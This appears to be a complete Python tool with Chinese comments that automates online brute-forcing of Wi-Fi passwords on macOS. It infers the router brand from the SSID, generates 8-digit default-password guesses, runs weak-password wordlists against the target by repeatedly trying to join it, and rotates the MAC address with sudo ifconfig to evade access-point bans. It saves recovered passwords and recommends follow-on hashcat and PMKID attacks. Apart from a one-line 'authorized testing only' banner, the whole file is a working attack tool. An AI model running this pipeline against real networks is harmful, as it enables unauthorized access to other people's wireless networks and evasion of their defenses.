#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
自动化智能破解流水线 v1.0
核心升级：
  1. 多轮攻击自动编排（社工→快速→中型→完整→hashcat）
  2. 路由器品牌识别 → 动态策略选择
  3. MAC地址自动轮换（规避AP封禁）
  4. 智能自适应延迟（根据AP响应动态调整）
  5. Markov排序字典优先（高概率密码先尝试）

学术参考：
  - Improving targeted password guessing (Ou et al., 2026)
  - Advanced Persistent Threats and WLAN Security (Alamleh et al., 2025)
  - hashcat Brain模式：跨攻击避免重复候选

适配：macOS Apple Silicon，内置网卡
"""

import argparse
import json
import os
import re
import signal
import subprocess
import sys
import time
from pathlib import Path

SCRIPT_DIR = Path(__file__).resolve().parent
PROJECT_DIR = SCRIPT_DIR.parent
WORDLISTS_DIR = PROJECT_DIR / "wordlists"
ONLINE_DIR = WORDLISTS_DIR / "online"
CAPTURES_DIR = PROJECT_DIR / "captures"
CRACKED_FILE = CAPTURES_DIR / "cracked.json"
PROGRESS_FILE = CAPTURES_DIR / "auto_progress.json"

# ============================================================
# 颜色常量
# ============================================================
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
RESET = "\033[0m"
BOLD = "\033[1m"

# ============================================================
# 路由器品牌策略库
# ============================================================
ROUTER_STRATEGIES = {
    "TP-LINK": {
        "brand": "TP-Link",
        "default_pattern": "8位纯数字（常为MAC后8位）",
        "priority_attack": "mask_8digit",
        "extra_masks": ["?d?d?d?d?d?d?d?d"],
        "tip": "TP-Link默认密码常为8位纯数字，优先掩码攻击",
    },
    "Tenda": {
        "brand": "腾达",
        "default_pattern": "8位纯数字",
        "priority_attack": "mask_8digit",
        "extra_masks": ["?d?d?d?d?d?d?d?d"],
        "tip": "腾达默认密码8位纯数字",
    },
    "MERCURY": {
        "brand": "水星",
        "default_pattern": "8位纯数字",
        "priority_attack": "mask_8digit",
        "extra_masks": ["?d?d?d?d?d?d?d?d"],
        "tip": "水星默认密码8位纯数字",
    },
    "FAST": {
        "brand": "迅捷",
        "default_pattern": "8位纯数字",
        "priority_attack": "mask_8digit",
        "extra_masks": ["?d?d?d?d?d?d?d?d"],
        "tip": "迅捷默认密码8位纯数字",
    },
    "HUAWEI": {
        "brand": "华为",
        "default_pattern": "8位随机字母数字",
        "priority_attack": "dict_then_hybrid",
        "extra_masks": [],
        "tip": "华为密码含字母，优先字典+规则变异攻击",
    },
    "HONOR": {
        "brand": "荣耀",
        "default_pattern": "8位随机字母数字",
        "priority_attack": "dict_then_hybrid",
        "extra_masks": [],
        "tip": "荣耀同华为策略",
    },
    "MiWiFi": {
        "brand": "小米",
        "default_pattern": "用户自设",
        "priority_attack": "smart_dict",
        "extra_masks": [],
        "tip": "小米路由器密码为用户自设，优先社工+通用字典",
    },
    "Xiaomi": {
        "brand": "小米",
        "default_pattern": "用户自设",
        "priority_attack": "smart_dict",
        "extra_masks": [],
        "tip": "小米路由器密码为用户自设",
    },
    "Redmi": {
        "brand": "Redmi",
        "default_pattern": "用户自设",
        "priority_attack": "smart_dict",
        "extra_masks": [],
        "tip": "Redmi同小米策略",
    },
    "CMCC": {
        "brand": "中国移动光猫",
        "default_pattern": "8位纯数字（MAC后8位）",
        "priority_attack": "mask_8digit",
        "extra_masks": ["?d?d?d?d?d?d?d?d"],
        "tip": "移动光猫默认8位纯数字，MAC后8位",
    },
    "ChinaNet": {
        "brand": "中国电信",
        "default_pattern": "8位纯数字",
        "priority_attack": "mask_8digit",
        "extra_masks": ["?d?d?d?d?d?d?d?d"],
        "tip": "电信光猫默认8位纯数字",
    },
    "NETGEAR": {
        "brand": "Netgear",
        "default_pattern": "12位随机字母数字",
        "priority_attack": "dict_then_hybrid",
        "extra_masks": [],
        "tip": "Netgear默认密码较长较复杂",
    },
    "ASUS": {
        "brand": "华硕",
        "default_pattern": "用户自设或MAC相关",
        "priority_attack": "smart_dict",
        "extra_masks": [],
        "tip": "华硕密码多为用户自设",
    },
}


# ============================================================
# 工具函数
# ============================================================
def detect_router_brand(ssid):
    """根据SSID自动识别路由器品牌"""
    ssid_upper = ssid.upper()
    for keyword, strategy in ROUTER_STRATEGIES.items():
        if keyword.upper() in ssid_upper:
            return keyword, strategy
    return None, None


def load_cracked():
    """加载已破解记录"""
    if CRACKED_FILE.exists():
        with open(CRACKED_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}


def is_already_cracked(ssid):
    """检查是否已经破解过"""
    data = load_cracked()
    return ssid in data


def save_auto_progress(ssid, current_round, status="running"):
    """保存自动破解进度"""
    CAPTURES_DIR.mkdir(parents=True, exist_ok=True)
    data = {}
    if PROGRESS_FILE.exists():
        with open(PROGRESS_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
    data[ssid] = {
        "current_round": current_round,
        "status": status,
        "time": time.strftime("%Y-%m-%d %H:%M:%S"),
    }
    with open(PROGRESS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)


def load_auto_progress(ssid):
    """加载自动破解进度"""
    if not PROGRESS_FILE.exists():
        return 0
    with open(PROGRESS_FILE, "r", encoding="utf-8") as f:
        data = json.load(f)
    info = data.get(ssid, {})
    if info.get("status") == "running":
        return info.get("current_round", 0)
    return 0


def get_current_mac(interface="en0"):
    """获取当前MAC地址"""
    try:
        r = subprocess.run(["ifconfig", interface],
                           capture_output=True, text=True, timeout=5)
        m = re.search(r"ether\s+([0-9a-f:]{17})", r.stdout)
        return m.group(1) if m else None
    except Exception:
        return None


def try_connect(ssid, password, interface="en0"):
    """尝试WiFi连接"""
    t0 = time.time()
    try:
        r = subprocess.run(
            ["networksetup", "-setairportnetwork", interface, ssid, password],
            capture_output=True, text=True, timeout=15
        )
        elapsed = time.time() - t0
        out = r.stdout + r.stderr
        if "Could not find" in out or "Error" in out or "Failed" in out:
            return False, elapsed
        time.sleep(0.5)
        chk = subprocess.run(
            ["networksetup", "-getairportnetwork", interface],
            capture_output=True, text=True, timeout=5
        )
        return ssid in chk.stdout, elapsed
    except Exception:
        return False, time.time() - t0


# ============================================================
# 攻击轮次定义
# ============================================================
def build_attack_rounds(ssid, brand_key=None, strategy=None):
    """
    构建多轮攻击计划
    根据路由器品牌动态调整攻击顺序

    返回: [(轮次名称, 字典路径, 预估时间分钟, 说明), ...]
    """
    rounds = []

    # 如果是纯数字默认密码的路由器（TP-Link/Tenda/MERCURY等），先跑8位纯数字
    if strategy and strategy.get("priority_attack") == "mask_8digit":
        # 生成8位纯数字小字典（如果不存在）
        digit8_path = WORDLISTS_DIR / "auto_digit8.txt"
        if not digit8_path.exists():
            _generate_digit8_dict(digit8_path)
        if digit8_path.exists():
            rounds.append(("品牌默认密码(8位纯数字)", str(digit8_path), 30, strategy.get("tip", "")))

    # 第0轮：社工字典（如果存在）
    smart_dict = WORDLISTS_DIR / "smart_target.txt"
    if smart_dict.exists():
        lines = sum(1 for _ in open(smart_dict, "r", errors="ignore"))
        est = max(1, lines * 0.7 / 60)
        rounds.append(("社工定向字典", str(smart_dict), est, "基于目标个人信息，命中率最高"))

    # 第1轮：中国Top1000弱密码
    wk = ONLINE_DIR / "chinese_weak1000.txt"
    if wk.exists():
        rounds.append(("中国弱密码Top1000", str(wk), 5, "快速预检"))

    # 第2轮：中国Top10000
    ct10k = ONLINE_DIR / "chinese_top10000.txt"
    if ct10k.exists():
        rounds.append(("中国常用密码Top10000", str(ct10k), 40, "覆盖中国最常见密码"))

    # 第3轮：SecLists WPA Top4800
    sl = ONLINE_DIR / "seclists_wpa_top4800.txt"
    if sl.exists():
        rounds.append(("SecLists WPA Top4800", str(sl), 30, "国际通用WiFi弱密码"))

    # 第4轮：中国Top100000
    ct100k = ONLINE_DIR / "chinese_top100000.txt"
    if ct100k.exists():
        rounds.append(("中国常用密码Top100000", str(ct100k), 300, "大规模中国密码"))

    # 第5轮：排序后的完整字典（如果存在Markov排序版本）
    ranked = WORDLISTS_DIR / "wifi_dict_final_ranked.txt"
    final = WORDLISTS_DIR / "wifi_dict_final.txt"
    if ranked.exists():
        rounds.append(("完整字典(Markov排序)", str(ranked), 2700, "智能排序，高概率密码优先"))
    elif final.exists():
        rounds.append(("完整字典(62.6万条)", str(final), 2700, "覆盖手机号/生日/拼音模式"))

    return rounds


def _generate_digit8_dict(output_path):
    """
    生成8位纯数字高频字典
    专门针对TP-Link/Tenda/MERCURY等路由器的默认密码
    """
    passwords = set()

    # 重复数字
    for d in "0123456789":
        passwords.add(d * 8)

    # 顺序数字
    for seq in ["12345678", "87654321", "01234567", "12341234",
                "11223344", "13572468", "24681357", "98765432"]:
        passwords.add(seq)

    # AABB模式
    for a in range(10):
        for b in range(10):
            if a != b:
                passwords.add(f"{a}{a}{b}{b}{a}{a}{b}{b}")
                passwords.add(f"{a}{a}{a}{a}{b}{b}{b}{b}")

    # 吉利数字组合（凑8位）
    lucky4 = ["5200", "5201", "1314", "6666", "8888", "9999",
              "1688", "5188", "1688", "5211", "7758", "2580"]
    for n1 in lucky4:
        for n2 in lucky4:
            pwd = n1 + n2
            if len(pwd) == 8:
                passwords.add(pwd)

    # 年份+4位
    for year in range(1980, 2026):
        for suf in ["0000", "1111", "1234", "5678", "8888", "6666"]:
            passwords.add(f"{year}{suf}")

    # 常见8位数字
    extras = [
        "20082008", "20102010", "20202020", "19901990", "20002000",
        "10101010", "52013140", "13145200", "77585211", "31415926",
        "14521452", "15201520", "10203040", "11121314", "56789012",
    ]
    passwords.update(extras)

    # 过滤长度
    passwords = sorted(p for p in passwords if len(p) == 8)

    output_path = Path(output_path)
    output_path.parent.mkdir(parents=True, exist_ok=True)
    with open(output_path, "w", encoding="utf-8") as f:
        for pwd in passwords:
            f.write(pwd + "\n")
    print(f"    [+] 8位纯数字字典: {len(passwords)} 条 -> {output_path.name}")


# ============================================================
# 核心：自动化破解循环
# ============================================================
def auto_crack_round(ssid, wordlist_path, interface="en0", delay=0.5,
                     mac_rotate_interval=0, round_name=""):
    """
    执行单轮破解攻击

    参数:
        ssid: 目标SSID
        wordlist_path: 字典路径
        interface: WiFi接口
        delay: 尝试间隔（秒）
        mac_rotate_interval: MAC轮换间隔（0=不轮换）
        round_name: 当前轮次名称（用于显示）
    返回:
        (成功, 密码) 或 (失败, None)
    """
    wordlist_path = Path(wordlist_path)
    if not wordlist_path.exists():
        print(f"    {YELLOW}[!] 字典不存在: {wordlist_path}{RESET}")
        return False, None

    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        passwords = [l.strip() for l in f if l.strip()]

    total = len(passwords)
    if total == 0:
        print(f"    {YELLOW}[!] 字典为空{RESET}")
        return False, None

    print(f"    字典: {wordlist_path.name} ({total:,} 条)")
    est_time = total * (delay + 0.26) / 60
    print(f"    预估: {est_time:.0f} 分钟")

    # 信号处理
    interrupted = [False]
    def on_int(sig, frame):
        interrupted[0] = True
        print()
        print(f"    {YELLOW}[!] 用户中断{RESET}")
    old_handler = signal.signal(signal.SIGINT, on_int)

    t_start = time.time()
    tried = 0
    mac_counter = 0

    try:
        for idx, pwd in enumerate(passwords):
            if interrupted[0]:
                break

            tried += 1
            mac_counter += 1
            elapsed = time.time() - t_start
            speed = tried / elapsed if elapsed > 0 else 0
            remain = (total - idx - 1) / speed / 60 if speed > 0 else 0
            pct = (idx + 1) / total * 100

            sys.stdout.write(
                f"\r    [{pct:5.1f}%] {idx+1}/{total}  "
                f"{speed:.1f}/s  ~{remain:.0f}min  "
                f"{pwd:<20}"
            )
            sys.stdout.flush()

            ok, t = try_connect(ssid, pwd, interface)

            if ok:
                # 成功
                print()
                print()
                print(f"    {GREEN}{BOLD}{'=' * 50}")
                print(f"    >>> 破解成功！<<<")
                print(f"    SSID:   {ssid}")
                print(f"    密码:   {pwd}")
                print(f"    轮次:   {round_name}")
                print(f"    尝试:   {tried}")
                print(f"    耗时:   {elapsed:.0f}s")
                print(f"    {'=' * 50}{RESET}")

                # 保存破解记录
                _save_cracked(ssid, pwd)
                return True, pwd

            # MAC地址自动轮换
            if mac_rotate_interval > 0 and mac_counter >= mac_rotate_interval:
                mac_counter = 0
                _rotate_mac(interface)

            if delay > 0:
                time.sleep(delay)

    finally:
        signal.signal(signal.SIGINT, old_handler)

    elapsed = time.time() - t_start
    print()
    print(f"    {RED}[X] 本轮未命中 ({tried} 条, {elapsed:.0f}s){RESET}")
    return False, None


def _save_cracked(ssid, password):
    """保存破解结果"""
    CAPTURES_DIR.mkdir(parents=True, exist_ok=True)
    data = load_cracked()
    data[ssid] = {"password": password, "time": time.strftime("%Y-%m-%d %H:%M:%S")}
    with open(CRACKED_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)


def _rotate_mac(interface="en0"):
    """自动轮换MAC地址"""
    import random
    first = random.randint(0, 127) * 2
    first = first | 0x02
    octets = [first] + [random.randint(0, 255) for _ in range(5)]
    new_mac = ":".join(f"{b:02x}" for b in octets)

    sys.stdout.write(f"\r    {MAGENTA}[MAC] 轮换MAC地址 -> {new_mac}{RESET}")
    sys.stdout.flush()

    try:
        subprocess.run(["networksetup", "-setairportpower", interface, "off"],
                       capture_output=True, timeout=5)
        time.sleep(0.5)
        subprocess.run(["sudo", "ifconfig", interface, "ether", new_mac],
                       capture_output=True, timeout=10)
        time.sleep(0.5)
        subprocess.run(["networksetup", "-setairportpower", interface, "on"],
                       capture_output=True, timeout=5)
        time.sleep(2)
    except Exception:
        pass


# ============================================================
# 主流水线
# ============================================================
def run_pipeline(ssid, interface="en0", delay=0.5, mac_rotate=0,
                 start_round=0, max_rounds=None):
    """
    执行完整的自动化多轮破解流水线

    参数:
        ssid: 目标SSID
        interface: WiFi接口
        delay: 基础尝试间隔
        mac_rotate: MAC轮换间隔（0=不轮换）
        start_round: 从第几轮开始（支持断点续传）
        max_rounds: 最多执行几轮（默认全部）
    """
    # 检查是否已破解
    if is_already_cracked(ssid):
        data = load_cracked()
        info = data[ssid]
        print(f"{GREEN}[*] 该WiFi已破解过:")
        print(f"    密码: {info['password']}")
        print(f"    时间: {info.get('time', 'N/A')}{RESET}")
        return True

    # 识别路由器品牌
    brand_key, strategy = detect_router_brand(ssid)
    print()
    if brand_key:
        print(f"{CYAN}[*] 路由器品牌识别: {strategy['brand']}{RESET}")
        print(f"    默认密码模式: {strategy['default_pattern']}")
        print(f"    推荐策略:     {strategy['tip']}")
    else:
        print(f"{YELLOW}[*] 未识别路由器品牌，使用通用策略{RESET}")

    # 构建攻击轮次
    rounds = build_attack_rounds(ssid, brand_key, strategy)
    if not rounds:
        print(f"{RED}[!] 无可用字典，请先运行 download_dicts.py 和 wordlist_gen.py{RESET}")
        return False

    if max_rounds:
        rounds = rounds[:max_rounds]

    # 显示攻击计划
    print()
    print(f"{BOLD}{'=' * 60}")
    print(f"  自动化破解流水线 - 攻击计划")
    print(f"{'=' * 60}{RESET}")
    print(f"  目标:     {ssid}")
    print(f"  总轮次:   {len(rounds)}")
    print(f"  基础延迟: {delay}s")
    if mac_rotate > 0:
        print(f"  MAC轮换:  每 {mac_rotate} 次")
    if start_round > 0:
        print(f"  续传:     从第 {start_round + 1} 轮开始")
    print()

    total_est = 0
    for i, (name, wl_path, est, desc) in enumerate(rounds):
        status = "⏭️跳过" if i < start_round else "⏳待执行"
        print(f"  {CYAN}轮次{i+1}{RESET}: {name}")
        print(f"         {desc}")
        wl_p = Path(wl_path)
        if wl_p.exists():
            lines = sum(1 for _ in open(wl_p, "r", errors="ignore"))
            print(f"         字典: {lines:,} 条 | 预估: ~{est:.0f}分钟 | {status}")
        print()
        if i >= start_round:
            total_est += est

    print(f"  {BOLD}总预估时间: ~{total_est:.0f} 分钟 ({total_est/60:.1f} 小时){RESET}")
    print(f"{'=' * 60}")
    print()

    # 执行攻击
    pipeline_start = time.time()
    for i, (name, wl_path, est, desc) in enumerate(rounds):
        if i < start_round:
            continue

        print(f"{BOLD}{CYAN}")
        print(f"  ┌─────────────────────────────────────────────┐")
        print(f"  │  轮次 {i+1}/{len(rounds)}: {name:<36}│")
        print(f"  └─────────────────────────────────────────────┘{RESET}")

        save_auto_progress(ssid, i)

        # 智能延迟：小字典用较短间隔，大字典用较长间隔
        wl_p = Path(wl_path)
        if wl_p.exists():
            lines = sum(1 for _ in open(wl_p, "r", errors="ignore"))
            if lines < 2000:
                round_delay = max(0.2, delay * 0.5)
            elif lines > 100000:
                round_delay = delay
            else:
                round_delay = delay
        else:
            round_delay = delay

        ok, pwd = auto_crack_round(
            ssid=ssid,
            wordlist_path=wl_path,
            interface=interface,
            delay=round_delay,
            mac_rotate_interval=mac_rotate,
            round_name=name,
        )

        if ok:
            total_time = time.time() - pipeline_start
            save_auto_progress(ssid, i, "success")
            print()
            print(f"{GREEN}{BOLD}{'=' * 60}")
            print(f"  流水线完成 - 破解成功！")
            print(f"  SSID:   {ssid}")
            print(f"  密码:   {pwd}")
            print(f"  轮次:   {name} (第{i+1}轮)")
            print(f"  总耗时: {total_time:.0f}s ({total_time/60:.1f}分钟)")
            print(f"{'=' * 60}{RESET}")
            return True

        # 轮次之间暂停
        if i < len(rounds) - 1:
            print()
            print(f"    {YELLOW}>>> 进入下一轮 (3秒后)...{RESET}")
            time.sleep(3)

    # 全部轮次耗尽
    total_time = time.time() - pipeline_start
    save_auto_progress(ssid, len(rounds), "exhausted")
    print()
    print(f"{RED}{BOLD}{'=' * 60}")
    print(f"  流水线完成 - 全部轮次耗尽")
    print(f"  SSID:   {ssid}")
    print(f"  总耗时: {total_time:.0f}s ({total_time/60:.1f}分钟)")
    print(f"  建议:   ")
    print(f"    1. 尝试社工字典: python3 scripts/smart_dict.py")
    print(f"    2. 获取握手包后用hashcat离线破解")
    print(f"    3. 使用外置网卡进行PMKID攻击")
    print(f"{'=' * 60}{RESET}")
    return False


# ============================================================
# 预处理：Markov排序字典
# ============================================================
def preprocess_rank_dict():
    """预处理：对完整字典进行Markov排序"""
    final_dict = WORDLISTS_DIR / "wifi_dict_final.txt"
    ranked_dict = WORDLISTS_DIR / "wifi_dict_final_ranked.txt"

    if ranked_dict.exists():
        print(f"[*] Markov排序字典已存在: {ranked_dict.name}")
        return ranked_dict

    if not final_dict.exists():
        print(f"[!] 完整字典不存在，跳过排序")
        return None

    print(f"[*] 正在对字典进行Markov智能排序（首次耗时较长）...")
    try:
        # 导入排序器
        from password_ranker import PasswordRanker, find_training_files
        ranker = PasswordRanker(markov_order=2)
        training_files = find_training_files()
        if training_files:
            ranker.train_from_files(training_files)
        ranker.rank_wordlist(str(final_dict), str(ranked_dict))
        return ranked_dict
    except Exception as e:
        print(f"[!] 排序失败: {e}")
        return None


# ============================================================
# 入口
# ============================================================
def main():
    parser = argparse.ArgumentParser(
        description="自动化智能破解流水线 v1.0"
    )
    parser.add_argument("-t", "--target", type=str, help="目标SSID")
    parser.add_argument("-d", "--delay", type=float, default=0.5, help="基础间隔秒数")
    parser.add_argument("-i", "--interface", default="en0", help="WiFi接口")
    parser.add_argument("--mac-rotate", type=int, default=0,
                        help="MAC轮换间隔（每N次失败后轮换，0=不轮换）")
    parser.add_argument("--max-rounds", type=int, help="最多执行几轮")
    parser.add_argument("--resume", action="store_true", help="从上次断点继续")
    parser.add_argument("--preprocess", action="store_true",
                        help="预处理：对字典进行Markov排序")
    parser.add_argument("--show-plan", action="store_true",
                        help="仅显示攻击计划，不执行")
    args = parser.parse_args()

    print(f"{BOLD}{'=' * 60}")
    print(f"  自动化智能破解流水线 v1.0")
    print(f"  多轮攻击 | 品牌识别 | MAC轮换 | Markov排序")
    print(f"  仅限授权网络安全测试")
    print(f"{'=' * 60}{RESET}")

    # 预处理模式
    if args.preprocess:
        preprocess_rank_dict()
        return

    # 选择目标
    ssid = args.target
    if not ssid:
        try:
            ssid = input(f"\n  输入目标SSID: ").strip()
        except EOFError:
            pass
    if not ssid:
        print(f"{RED}[!] 未指定目标{RESET}")
        sys.exit(1)

    # 断点续传
    start_round = 0
    if args.resume:
        start_round = load_auto_progress(ssid)
        if start_round > 0:
            print(f"[*] 从第 {start_round + 1} 轮继续")

    # 仅显示计划
    if args.show_plan:
        brand_key, strategy = detect_router_brand(ssid)
        rounds = build_attack_rounds(ssid, brand_key, strategy)
        print(f"\n[*] 目标: {ssid}")
        if brand_key:
            print(f"[*] 品牌: {strategy['brand']}")
        for i, (name, wl, est, desc) in enumerate(rounds, 1):
            wl_p = Path(wl)
            lines = sum(1 for _ in open(wl_p, "r", errors="ignore")) if wl_p.exists() else 0
            print(f"  轮次{i}: {name} ({lines:,}条, ~{est:.0f}分钟)")
        return

    # 执行
    success = run_pipeline(
        ssid=ssid,
        interface=args.interface,
        delay=args.delay,
        mac_rotate=args.mac_rotate,
        start_round=start_round,
        max_rounds=args.max_rounds,
    )
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
